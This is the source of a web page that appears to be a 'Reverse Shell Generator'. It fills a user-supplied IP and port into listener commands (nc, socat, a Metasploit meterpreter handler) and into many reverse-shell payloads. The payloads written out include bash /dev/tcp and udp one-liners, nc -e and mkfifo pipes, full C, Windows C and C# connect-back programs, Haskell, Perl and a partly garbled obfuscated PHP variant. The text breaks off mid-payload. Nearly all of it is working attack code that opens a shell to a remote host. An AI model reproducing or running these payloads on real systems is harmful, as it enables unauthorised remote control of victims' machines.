

<!-- Include Head -->
<?php include "assest/head.php"; ?>
<?php include "assest/header.php" ?>
    <!-- </Header> -->
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">

<link href='https://fonts.googleapis.com/css?family=Nunito Sans' rel='stylesheet'>
<link href="css/style.css" type="text/css" rel="stylesheet" />

<link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
<link rel="stylesheet" href="https://www.w3schools.com/lib/w3-theme-black.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.3.0/css/font-awesome.min.css">
 <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
 
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body {
    font-family: 'Nunito Sans';font-size: 20px;
}
 
[contenteditable] {
  outline: 0px solid transparent;
}

p.solid {border-style: solid;}

#main {
  width: 200px;
  height: 200px;
  border: 1px solid #c3c3c3;
  display: flex;
  flex-wrap: wrap;
}

.float-left-child {
  float: left;
}
.float-right-child {
  float: right;
}

.filterDiv {
  float: left;
   white-space: nowrap;
  text-align: center;
  margin: 2px;
  display: none;
}
.show {
  display: block;
}

.container {
  margin-top: 20px;
  overflow: hidden;
  white-space:normal;
  display:flex;
}

.commandline {
  margin-top: 20px;
  overflow: hidden;
  width: 50%;
  white-space:normal;
  display:flex;
}

.button {
 
  border: none;
  color: white;
  padding: 12px;
  width: 200px;
  text-align: center;
  text-decoration: none;
  display: inline-block;
  font-size: 17px;

}
.button.active {
background-color: #666;
  color: black;
  }
  
.btn {
  border: none;
  outline: none;
  padding: 0px 16px;
  background-color: #f1f1f1;
  cursor: pointer;
}
.btn:hover {
  background-color: #ddd;
}

.btn.active {
  background-color: #666;
  color: black;
}

/* Style the tab */
.tab {
 
  float: left;
  border: 1px solid #ccc;
  background-color: #f1f1f1;
  width: 30%;
  height: 140px;
}

/* Style the buttons inside the tab */
.tab button {
  display: block;
  background-color: inherit;
  color: black;
  padding: 22px 16px;
  width: 100%;
  border: none;
  outline: none;
  font-size: 17px;
}

#mydiv {
 
  width:100%;
  height: 100px;
  display: flex;
  flex-wrap:wrap;
  
}

#no {
  width:100%;
  height: 100px;
  display: flex;
  flex-wrap:nowrap;
}

/* Change background color of buttons on hover */
.tab button:hover {
  background-color: #ddd;
}

/* Create an active/current "tab button" class */
.tab button.active {
  background-color: #ccc;
}

/* Style the tab content */
.tabcontent {
  float: left;
  padding: 0px 12px;
 
  height: 300px;
  flex-wrap:wrap;
}

.tabspecial {
  float: left;
  padding: 0px 12px;
 
  width: 80%;
 
  height: 300px;
  flex-wrap:wrap;
}
.specialspace {

  flex-wrap:wrap;
}

.vertical-menu {
  width: 160px;
  height:500px;
  overflow-y: auto;

}

.vertical-try {
  width: 160px;
  height:200px;
  overflow-y: auto;

}

.vertical-menu a {
  background-color: #eee;
  color: black;
  display: block;
  padding: 12px 20px;
  text-decoration: none;
   flex-wrap:nowrap;
}

.vertical-menu a:hover {
  background-color: #ccc;
 
}

.vertical-menu a.active {
  background-color: white;
  color: black;
   
}

.float-container {
    border: 3px solid #fff;
    padding: 22px 16 px;
   flex-wrap:wrap;
}

.float-child {
    width: 100%;
 
    padding: 22px 16px;
 flex-wrap:wrap;
}

.container{
    display: flex;
  flex-wrap:wrap;
}
.fixed{
    width: 200px;
}
.flex-item{
    flex-grow: 20;
}
</style>
  
</head>
<body>


<!-- Navigation Bar -->
<div class="w3-bar w3-white w3-border-bottom w3-center">
  <h1> Reverse Shell Generator</h1>



<hr>

<div class="w3-row-padding">
<div class="w3-half">
<div class="w3-card white">
  <div class="w3-container w3-indigo">
    <h3>IP address & Port</h3>
  </div>
  <div class="w3-container">
 
  </div>
  <ul class="w3-ul w3-border-top">
    <li>
      
      <script>
      var ip=document.createElement("ip");
       var port=document.createElement("port");
      </script>
      
     <br>
<p>IP address:</p>
 <input id="numbie2" id="ip" onchange="myFunction()">
 <p>

  <h1>    </h1>
  

 
<p>Port:</p>
 <input id="numb" id="port" onchange="secFunction()">
    
    
    <br>
    <br>
  </ul>
  
  
</div>
</div>

<div class="w3-half">
<div class="w3-card white">
  <div class="w3-container w3-theme">
    <h3>Listener</h3>
  </div>
 
  <div class="w3-container">
  
  <h3 class="w3-text-theme w3-large">
  
  <div class="w3-center">
<div class="w3-bar w3-theme">

 
   <button class="w3-bar-item w3-button testbuttn w3-medium" onclick="listener(event,'other types')">Others</button>
  <button class="w3-button w3-medium testbuttn" onclick="listener(event,'socat')">socat</button>
  <button class="w3-bar-item w3-button testbuttn w3-medium" onclick="listener(event,'MSF')">msfconsole</button>

 </div>
  
   </div>
 
  <div id="socat" class="w3-container city1 w3-animate-opacity">
  <br>
<div id="mydiv">
      <p>socat -d -d TCP-LISTEN:</p>
      <p id="port hundred one"></p>
  <p> &nbsp;STDOUT</p>
  </div>
 </div>
 
 
  
  <div id="MSF" class="w3-container city1 w3-left-align w3-animate-opacity">
    <br>
 
   <p>
    msfconsole -q -x &#8243use multi/handler;
    set payload windows/x64/meterpreter/reverse_tcp;
    </p>
    <div id="mydiv">
  <p>  set lhost&nbsp</p>
   <p id="demo"></p>
<p>; set lport&nbsp</p>

 <p id="port hundred"> </p>
  <p>; exploit&#8243</p>
  </div>
  
<br>
<br>
  
 </div>
 
 <div id="other types" class="w3-container city1 w3-animate-opacity">
 <br>
 
    <label for="type">Type:</label>

<select class="type" name="type">

<option value="choose one"> </option>
  <option value="nc -lvnp &nbsp;">nc</option>
  <option value="ncat -lvnp &nbsp; ">ncat</option>
  <option value="ncat --ssl -lvnp &nbsp;">ncat (TLS)</option>
  <option value="rlwrap -cAr nc lvnp &nbsp;">rlwrap + nc</option>
 <option value="rcat -lp &nbsp;">rustcat</option>
  <option value="rcat -lHp &nbsp;">rustcat + Command History</option>
   <option value="python3 -m pwncat -lp &nbsp; ">pwncat</option>
    <option value="stty raw -echo; (stty size; cat) | nc -lvnp &nbsp;">windows ConPty</option>
    


      <option value="socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:">socat (TTY)</option>
       <option value="powercat -l -p &nbsp; ">powercat</option>
       
</select>


<br>
<br>
   <div id ="mydiv">
   <p id="other cases"></p>
   <p> &nbsp</p>
 <div class="result"></div>
  
   <p id="input port"> </p>
  
     </div>
  
      
      
   
 
  <script>
 

  const selectElement = document.querySelector('.type');

selectElement.addEventListener('change', (event) => {
  const result = document.querySelector('.result');
 
 
result.textContent = `  ${event.target.value}`;

});

  </script>


 </div>
</div>
</div>
 <br>
</div>

</div>
</div>
   
 
  
 
<br>
 
<div class="w3-center">
<div class="w3-bar w3-theme">

  <button class="w3-bar-item w3-button testbtn w3-padding-16" onclick="openCity(event,'Reverse')">Reverse</button>
  <button class="w3-bar-item w3-button testbtn w3-padding-16" onclick="openCity(event,'Bind')">Bind</button>
  <button class="w3-bar-item w3-button testbtn w3-padding-16" onclick="openCity(event,'MSFVenom')">MSFVenom</button>
  
</div>
</div>

<div id="Reverse" class="w3-container city w3-animate-opacity">



  <div class="w3-dropdown-hover">

    <button class="w3-button w3-theme w3-large" id="OS" name="OS"> OS: <i class="fa fa-caret-down"></i></button>
    <div class="w3-dropdown-content w3-bar-block w3-border">
    
    <!-- Control buttons -->
    <div class="vertical-try">
<div id="myBtnContainer">
  <div class="w3-bar-item w3-button" onclick="filterSelection('All')"> All</div>
  <div class="w3-bar-item w3-button" onclick="filterSelection('Linux')"> Linux</div>
  <div class="w3-bar-item w3-button" onclick="filterSelection('Windows')"> Windows</div>
  <div class="w3-bar-item w3-button" onclick="filterSelection('Mac')"> Mac</div>
</div>
</div>
    </div>
  </div>
  
   <div class="ans"> </div>
   
     <script>
     
     const selecterElement = document.querySelector('.OS');

selecterElement.addEventListener('change', (event) => {
  const ans = document.querySelector('.ans');
  ans.textContent = ` ${event.target.value}`;
});


</script>

     
     
    <div class="w3-container w3-right-align">
  <h3 class="w3-text-theme w3-large">
  
    <label>shell:

<select class="shell" name="shell">

<option value="choose one"> </option>
  <option value="sh">sh</option>
  <option value="/bin/sh">/bin/sh</option>
  <option value="bash"> bash</option>
 <option value="/bin/bash">/bin/bash</option>
  <option value="cmd">cmd</option>
   <option value="powershell">powershell</option>
    <option value="pwsh">pwsh</option>
     <option value="ash">ash</option>
      <option value="bsh">bsh</option>
       <option value="csh ">csh</option>
        <option value="ksh">ksh</option>
        <option value="zsh">zsh</option>
       <option value="pdksh">pdksh</option>
        <option value="tcsh">tcsh</option>
</select>
</label>



<br>
<br>

</div>



 <div id="mydiv">
 
<!-- The filterable elements. Note that some have multiple class names (this can be used if they belong to multiple categories) -->
 <div class="tab vertical-menu w3-large w3-container w3-border float-left-child">
 <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'bashi')" id="openonceagain">Bash -i</div>
  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'bash196')">Bash 196</div>
  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'bashread')" >Bash read line</div>
  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'bash5')">Bash 5</div>
  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'bashudp')">Bash udp</div>

  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'nce')">nc -e</div>
  <div class="tablinks w3-bar-item w3-button filterDiv All Windows" onclick="City(event, 'ncexe')">nc.exe -e</div>
  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'ncc')">nc -c</div>
 
  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'ncatudp')">ncat udp</div>
      <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'ncate')">ncat -e</div>
  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'ncmkfifo')">nc mkfifo</div>
    <div class="tablinks w3-bar-item w3-button filterDiv All Windows" onclick="City(event, 'ncatexe')">ncat.exe -e</div>
   <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'C')">C     </div>
  <div class="tablinks w3-bar-item w3-button filterDiv All Windows " onclick="City(event, 'Cwindows')">C Windows</div>
  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Windows" onclick="City(event, 'C#')">C#</div>
  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'Haskell')">Haskell #1</div>
  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'perl')">Perl</div>
  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'perlnosh')">Perl no sh</div>
  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'rustcat')">rustcat     </div>
  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'PHPemoji')">PHP Emoji</div>
  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Windows Mac"  onclick="City(event, 'PHPpentest')">PHP PentestMonkey</div>
  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Windows Mac" onclick="City(event, 'PHPivan')">PHP Ivan Sincek</div>
  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Windows Mac" onclick="City(event, 'PHPcmd')">PHP cmd</div>
  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'PHPexec')">PHP exec</div>
  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'PHPshellexec')">PHP shell_exec</div>
  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Windows Mac" onclick="City(event, 'PHPsys')">PHP system</div>
   <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'PHPpassthru')">PHP passthru</div>
  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Windows Mac" onclick="City(event, 'PHP')">PHP `</div>
  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Windows Mac" onclick="City(event, 'PHPpopen')">PHP popen</div>
  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Windows Mac" onclick="City(event, 'PHPproc')">PHP proc_open</div>
  <div class="tablinks w3-bar-item w3-button filterDiv All Windows " onclick="City(event, 'windowsconpty')">Windows ConPty</div>
  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'Awk')">Awk</div>
  <div class="tablinks w3-bar-item w3-button filterDiv All Windows" onclick="City(event, 'power1')">PowerShell #1</div>
  <div class="tablinks w3-bar-item w3-button filterDiv All Windows" onclick="City(event, 'power2')">PowerShell #2</div>
  <div class="tablinks w3-bar-item w3-button filterDiv All Windows" onclick="City(event, 'power3')">PowerShell #3</div>
  <div class="tablinks w3-bar-item w3-button filterDiv All Windows" onclick="City(event, 'power4')">PowerShell #4 (TLS)</div>
  <div class="tablinks w3-bar-item w3-button filterDiv All Windows " onclick="City(event, 'power364')">PowerShell #3 (Base64)</div>
   
<div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'zsh')">zsh</div>

  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'py1')">Python #1</div>
  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'py2')">Python #2</div>
  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'py31')">Python3 #1</div>
   <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'py32')">Python3 #2</div>
    <div class="tablinks w3-bar-item w3-button filterDiv All Linux" onclick="City(event, 'py3short')">Python3 shortest</div>
      <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'telnet')">telnet</div>
      <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'ruby1')">Ruby #1</div>
  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'rubynosh')">Ruby no sh</div>
        <div class="tablinks w3-bar-item w3-button filterDiv All Linux Windows Mac" onclick="City(event, 'dart')">Dart</div>
  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'socat1')">socat #1</div>
  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'socat2')" >socat #2 (TTY)</div>

  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'nodejs')">node.js</div>
  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Windows Mac" onclick="City(event, 'nodejs2')">node.js #2</div>
      <div class="tablinks w3-bar-item w3-button filterDiv All Windows" onclick="City(event, 'groovy')">Groovy</div>
      
  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'java1')">Java #1</div>
  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'java2')">Java #2</div>
   <div class="tablinks w3-bar-item w3-button filterDiv All Linux Windows Mac" onclick="City(event, 'java3')">Java #3</div>
    <div class="tablinks w3-bar-item w3-button filterDiv All Linux Windows Mac" onclick="City(event, 'js')">Javascript</div>

  <div class="tablinks w3-bar-item w3-button filterDiv All Linux " onclick="City(event, 'lua1')">Lua #1</div>
  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Windows" onclick="City(event, 'lua2')">Lua #2</div>

  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Windows Mac" onclick="City(event, 'golang')">Golang</div>



  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'vlang')">Vlang</div>
 
 </div>




 

  
 
 
 

<div id="bashi" class="tabcontent">
 <div class="float-right-child w3-container w3-border">
  <h3 class="  w3-large w3-display-container">
   

  
    <p>Command:</p>
   
    <div id="mydiv">
           <div class="shellans"> </div>
    <p> &nbsp -i >& /dev/tcp/ </p>
    <p id="ip eighteen"></p>

<p> / </p>
<p id="port eighteen"></p>

 
    <p> &nbsp 0>&1  </p>

    
    </div>


</div>
</div>


<div id="bash196" class="tabcontent">
 <div class="float-right-child w3-container w3-border">
  <h3 class="  w3-large w3-display-container">
   
  <p>Command:</p>
     
    <div id="mydiv">
    <p> 0&lt&196;exec 196&lt&gt/dev/tcp/
    </p>
    <p id="ip nineteen"></p>
    <p>/</p>
    <p id="port nineteen"></p>
    <p>;</p>
     <div class="one"> </div>
    
    <p>&nbsp &lt&196 >&196 2>&196</p>


    </div>

</div>
</div>





<div id="bashread" class="tabcontent">
 <div class="float-right-child w3-container w3-border">
  <h3 class="  w3-large w3-display-container">
   
  <p>Command:</p>
    <div id="mydiv">
    <p>  exec 5<>/dev/tcp/
    <p id="ip twenty"></p>
    <p>/</p>
    <p id="port twenty"></p>
    
    <p>;cat <&5 | while read line; do $line 2>&5 >&5; done  </p>
   
     </div>
</div>
</div>





<div id="bash5" class="tabcontent">
 <div class="float-right-child w3-container w3-border">
  <h3 class="  w3-large w3-display-container">
   
  <p>Command:</p>
   <div id="mydiv">
       <div class="two"> </div>
    <p> &nbsp -i 5<> /dev/tcp/</p>
    <p id="ip twenty one"></p>
    <p>/</p>
    <p id="port twenty one"></p>
    <p>&nbsp 0<&5 1>&5 2>&5 </p>
    
     </div>
</div>
</div>




<div id="bashudp" class="tabcontent">
 <div class="float-right-child w3-container w3-border">
  <h3 class="  w3-large w3-display-container">
   
  <p>Command:</p>
     <div id="mydiv">
     <div class="three"> </div>
    <p> &nbsp -i >& /dev/udp/ </p>
    <p id="ip twenty two"></p>
    <p>/</p>
    <p id="port twenty two"></p>
    
    
    <p> &nbsp 0>&1 </p>

 
 </div>
</div>
</div>






<div id="nce" class="tabcontent">
 <div class="float-right-child w3-container w3-border">
  <h3 class="  w3-large w3-display-container">
   
  <p>Command:</p>
    <div id="mydiv">
    <p>  nc -e &nbsp  </p>
    <div class="four"> </div>
    <p> &nbsp </p>
        <p id="ip twenty three"></p>
    <p> &nbsp </p>
        <p id="port twenty three"></p>
     
     </div>
</div>
</div>

<div id="ncexe" class="tabcontent">
 <div class="float-right-child w3-container w3-border">
  <h3 class="  w3-large w3-display-container">
   
  <p>Command:</p>
      <div id="mydiv">
    <p>  nc.exe -e &nbsp   </p>
    <div class="five"> </div>
       <p> &nbsp </p>
        <p id="ip twenty four"></p>
    <p> &nbsp </p>
        <p id="port twenty four"></p>

    
          </div>
</div>
</div>


<div id="ncc" class="tabcontent">
 <div class="float-right-child w3-container w3-border">
  <h3 class="  w3-large w3-display-container">
   
  <p>Command:</p>
      <div id="mydiv">
    <p> nc -c &nbsp</p>
    <div class="six"> </div>
        <p> &nbsp </p>
        <p id="ip twenty five"></p>
    <p> &nbsp </p>
        <p id="port twenty five"></p>

    
          </div>
</div>
</div>


<div id="ncatudp" class="tabcontent">
 <div class="float-right-child w3-container w3-border">
  <h3 class="  w3-large w3-display-container">
   
  <p>Command:</p>
        <div id="mydiv">
    <p> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|</p>
    
    
     <div class="seven"> </div>
     
     
     <p>&nbsp -i 2>&1|ncat -u &nbsp </p>
      <p id="ip twenty six"></p>
    <p> &nbsp </p>
        <p id="port twenty six"></p>
        
    <p>&nbsp >/tmp/f </p>
    
   </div>
</div>
</div>


<div id="ncate" class="tabcontent">
 <div class="float-right-child w3-container w3-border">
  <h3 class="  w3-large w3-display-container">
   
  <p>Command:</p>
        <div id="mydiv">
    <p>  ncat </p>
         <p> &nbsp </p>
        <p id="ip twenty seven"></p>
    <p> &nbsp </p>
        <p id="port twenty seven"></p>
        <p>&nbsp  -e bash &nbsp </p>
    <div class="eight"> </div>
     
</div>
</div>
</div>


<div id="ncmkfifo" class="tabcontent">
 <div class="float-right-child w3-container w3-border">
  <h3 class="  w3-large w3-display-container">
   
  <p>Command:</p>
    <div id="mydiv">
    <p> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|</p>
    
    <div class="nine"> </div>
    
   <p> &nbsp -i 2>&1|nc &nbsp </p>
    <p id="ip twenty eight"></p>
    <p> &nbsp </p>
        <p id="port twenty eight"></p>
   
   <p> &nbsp >/tmp/f  </p>
    
     
</div>
</div>
</div>



<div id="ncatexe" class="tabcontent">
 <div class="float-right-child w3-container w3-border">
  <h3 class="  w3-large w3-display-container">
   
  <p>Command:</p>
     <div id="mydiv">
    <p>  ncat.exe &nbsp</p>
    <p id="ip twenty nine"></p>
    <p> &nbsp </p>
        <p id="port twenty nine"></p>
       <p> &nbsp -e &nbsp </p>
    <div class="ten"> </div>
     
</div>
</div>

</div>


<div id="C" class="tabcontent">
 <div class="float-right-child w3-container w3-border">
  <h3 class="  w3-large w3-display-container">
   
  <p>Command:</p>
   
    <p>  #include &ltstdio.h&gt</p>
<p>#include &ltsys/socket.h&gt</p>

<p>#include &ltsys/types.h></p>
<p>#include &ltstdlib.h></p>
<p>#include &ltunistd.h></p>
<p>#include &ltnetinet/in.h></p>
<p>#include &ltarpa/inet.h></p>

int main(void){
  <div id="mydiv">
  <p>  int port =</p>
   <p> &nbsp </p>
        <p id="port thirty"></p>
          
 <p>;</p>
  </div>

   <p> struct sockaddr_in revsockaddr;</p>

   <p>  int sockt = socket(AF_INET, SOCK_STREAM, 0);</p>
   <p>  revsockaddr.sin_family = AF_INET;   </p>
   <p>  revsockaddr.sin_port = htons(port);</p>
   <div id="mydiv">
   <p>  revsockaddr.sin_addr.s_addr = inet_addr("</p>
   <p id="ip thirty"></p>
   <p>");</p>
</div>
   <p>  connect(sockt, (struct sockaddr *) &amp revsockaddr, </p>
     <p> sizeof(revsockaddr));</p>
     <p> dup2(sockt, 0);</p>
     <p> dup2(sockt, 1);</p>
     <p> dup2(sockt, 2);</p>

 <div id="mydiv">
     <p> char * const argv[] = {"</p>
     <div class="eleven"> </div>
     <p>", NULL};</p>
     </div>
     
      <div id="mydiv">
     <p> execve("</p>
     <div class="shellans"> </div>
     <p>", argv, NULL);</p>
</div>
     <p> return 0;  </p>
} </p>
   
     
</div>
</div>


<div id="Cwindows" class="tabcontent">
 <div class="float-right-child w3-container w3-border">
  <h3 class="  w3-large w3-display-container">
   
  <p>Command:</p>
    <p>  #include &ltwinsock2.h></p>
 <p> #include &ltstdio.h></p>
 <p> #pragma comment(lib,"ws2_32")</p>

 <p> WSADATA wsaData;</p>
 <p> SOCKET Winsock;</p>
 <p> struct sockaddr_in hax; </p>
 
 <div id="mydiv">
 <p> char ip_addr[16] = "</p>
  <p id="ip thirty one"></p>
<p> "; </p>
</div>

<div id="mydiv">
 <p> char port[6] = "</p>
  <p id="port thirty one"></p>
  <p>";   </p>
 
 </div>

 <p> STARTUPINFO ini_processo;</p>

 <p> PROCESS_INFORMATION processo_info;</p>

 <p> int main()</p>
 <p> {</p>
    <p>  WSAStartup(MAKEWORD(2, 2), &wsaData);</p>
    <p>  Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned  int)NULL);</p>


    <p>  struct hostent *host; </p>
    <p>  host = gethostbyname(ip_addr);</p>
    <p>  strcpy_s(ip_addr, inet_ntoa(*((struct in_addr *)host->h_addr)));</p>

    <p>  hax.sin_family = AF_INET;</p>
    <p>  hax.sin_port = htons(atoi(port));</p>
    <p>  hax.sin_addr.s_addr = inet_addr(ip_addr);</p>

    <p>  WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);</p>

    <p>  memset(&ini_processo, 0, sizeof(ini_processo));</p>
     <p> ini_processo.cb = sizeof(ini_processo);</p>
    <p>  ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; </p>
    <p>  ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;</p>

     <p>  TCHAR cmd[255] = TEXT("cmd.exe");</p>

     <p> CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);</p>

   <p>   return 0;</p>
 <p> } </p>
 
 </p>
    
     
</div>
</div>




<div id="C#" class="tabcontent">
 <div class="float-right-child w3-container w3-border">
  <h3 class="  w3-large w3-display-container ">
   
  <p>Command:</p>
    <p>
    
   <p>    using System;</p>
  <p> using System.Text;</p>
  <p> using System.IO;</p>
  <p> using System.Diagnostics;</p>
  <p> using System.ComponentModel;</p>
  <p> using System.Linq;</p>
  <p> using System.Net;</p>
  <p> using System.Net.Sockets;</p>


  <p> namespace ConnectBack</p>
  <p> {</p>
  <p>     public class Program</p>
  <p>     {</p>
      <p>     static StreamWriter streamWriter;</p>

      <p>     public static void Main(string[] args)</p>
      <p>     {</p>
      
       
 <div id="mydiv">
          <p>     using(TcpClient client = new TcpClient("</p>
        <p id="ip thirty two"></p>
      <p>    ", </p>
          <p> &nbsp </p>
            <p id="port thirty two"></p>
         <p> ))</p>
          </div>
          
          <p>     {</p>
                  <p> using(Stream stream = client.GetStream())</p>
                  <p> {</p>
                      <p> using(StreamReader rdr = new StreamReader(stream))</p>
                      <p> {</p>
                          <p> streamWriter = new StreamWriter(stream);</p>
                        
                      <p>     StringBuilder strInput = new StringBuilder();</p>
  
      <p>                     Process p = new Process();</p>
              <p>             p.StartInfo.FileName = "cmd.exe";</p>
                      <p>     p.StartInfo.CreateNoWindow = true;</p>
                          <p> p.StartInfo.UseShellExecute = false;</p>
                          <p> p.StartInfo.RedirectStandardOutput = true;</p>
                          <p> p.StartInfo.RedirectStandardInput = true;</p>
                          <p> p.StartInfo.RedirectStandardError = true;</p>
                          <p> p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);</p>
                          <p> p.Start();</p>
                          <p> p.BeginOutputReadLine();</p>
<br>
                          <p> while(true)</p>
                          <p> {</p>
                          <p>     strInput.Append(rdr.ReadLine());</p>
                      <p>         //strInput.Append("\n");</p>
                      <p>         p.StandardInput.WriteLine(strInput);</p>
                      <p>         strInput.Remove(0, strInput.Length);</p>
                      <p>     }</p>
                  <p>     }</p>
              <p>     }</p>
          <p>     }</p>
      <p>     }</p>

      <p>     private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)</p>
       <p>    {</p>
         <p>      StringBuilder strOutput = new StringBuilder();</p>

             <p>  if (!String.IsNullOrEmpty(outLine.Data))</p>
              <p> {</p>
                <p>   try</p>
              <p>     {</p>
               <p>        strOutput.Append(outLine.Data);</p>
               <p>        streamWriter.WriteLine(strOutput);</p>
               <p>        streamWriter.Flush();</p>
                <p>   }</p>
              <p>     catch (Exception err) { }</p>
            <p>   }</p>
        <p>   }</p>

      <p> }</p>
  <p> }</p>
    
    
    </p>
 
     
</div>
</div>





<div id="Haskell" class="tabcontent">
 <div class="float-right-child w3-container w3-border">
  <h3 class="  w3-large w3-display-container">
   
  <p>Command:</p>
    <p>
     <p>    module Main where </p>

    <p> import System.Process </p>

 <div id="mydiv">
    <p> main = callCommand "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f |&nbsp</p>
   <div class="twelve"> </div>
    <p>&nbsp -i 2>&1 | nc&nbsp</p>
         <p id="ip thirty three"></p>
   <p> &nbsp </p>
         <p id="port thirty three"></p>
   <p> &nbsp>/tmp/f" </p>
   </div>
    </p>
 
     
</div>
</div>




<div id="perl" class="tabcontent">
 <div class="float-right-child w3-container w3-border">
  <h3 class=" w3-large w3-display-container">
   
  <p>Command:</p>
 
 
  <div id="mydiv">
   <p>perl -e 'use Socket;$i=&quot</p>
   <p id="ip thirty four"></p>
  
       
  <p>&quot ;$p=</p>

   <p id="port thirty four"></p>
   <p>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec(&quot</p>
 
    <div class="thirteen"> </div>
    <p>&nbsp -i");};' </p>
    </div>
      
</div>
</div>





<div id="perlnosh" class="tabcontent">
 <div class="float-right-child w3-container w3-border">
  <h3 class="  w3-large w3-display-container">
   
  <p>Command:</p>
   <div id="mydiv">
    <p>
    perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"</p>
      <p id="ip thirty five"></p>
      <p> :</p>
      <p id="port thirty five"></p>
    
    <p>");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while&lt>;'
    
    </p>
  
     </div>
</div>
</div>





<div id="rustcat" class="tabcontent">
 <div class="float-right-child w3-container w3-border">
  <h3 class="  w3-large w3-display-container">
   
  <p>Command:</p>
  <div id="mydiv">
    <p>  rcat </p>
        <p> &nbsp </p>
        <p id="ip thirty six"></p>
    <p> &nbsp </p>
        <p id="port thirty six"></p>
         <p> &nbsp </p>
         <p>-r</p>
         <p> &nbsp </p>
            <div class="fourteen"> </div>
        
    </div>
    
     
</div>
</div>





<div id="PHPemoji" class="tabcontent">
 <div class="float-right-child w3-container w3-border">
  <h3 class="  w3-large w3-display-container">
   
  <p>Command:</p>
    <p>
    <p>php -r '$ð="1";$ð="2";$ð</p>
    <p>="3";$ð="4";$ð="5";$ð="6";$ð="7";$ð="8";</p>
    <p>$ð="9";$ð="0";$ð¤¢=" ";$ð¤="</p>
    <p>&lt";$ð¤ =">";$ð±="-</p>
    <p>";$ðµ="&";$ð¤©="i";$ð¤=".";$ð¤¨="/";$ð¥</p>
    <p>°="a";$ð="b";$ð¶="i";$ð="h";$ð="c";$ð¤</p>
    <p>£="d";$ð="e";$ð="f";$ð="k";$ð="n";$ð="o"</p>
